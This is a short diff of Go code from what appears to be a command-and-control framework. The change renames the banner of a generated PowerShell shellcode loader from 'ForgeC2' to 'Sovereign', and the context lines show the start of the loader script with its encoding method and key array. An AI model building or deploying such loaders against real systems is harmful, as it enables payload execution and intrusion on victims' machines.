@@ -65,7 +65,7 @@ func buildPS1Loader(encoded []byte, key []byte, method ShellcodeEncode) ([]byte,
 	}
 
 	var buf bytes.Buffer
-	buf.WriteString("# ForgeC2 shellcode loader (generated artifact)\n")
+	buf.WriteString("# Sovereign shellcode loader (generated artifact)\n")
 	buf.WriteString("$ErrorActionPreference = 'Stop'\n")
 	fmt.Fprintf(&buf, "$method = '%s'\n", string(method))
 	buf.WriteString("$key = [byte[]]([byte[]]@(")
